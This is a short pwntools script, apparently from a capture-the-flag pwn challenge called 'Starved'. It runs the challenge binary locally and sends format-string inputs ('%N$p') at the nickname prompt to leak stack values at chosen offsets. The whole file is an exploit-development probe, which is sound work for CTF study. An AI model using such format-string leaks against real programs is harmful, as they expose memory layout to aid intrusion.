from pwn import *
context.log_level='error'
for i in [27,29,85]:
    p=process(['/home/bocil/ctf/nfx/pwn/Starved/peserta/ld-linux-x86-64.so.2','--library-path','/home/bocil/ctf/nfx/pwn/Starved/peserta','/home/bocil/ctf/nfx/pwn/Starved/peserta/chall'],cwd='.')
    p.recvuntil(b'nick> '); p.sendline(('%'+str(i)+'$p').encode()); print('%%%d$p = %s'%(i,p.recvline().decode().strip())); p.close()
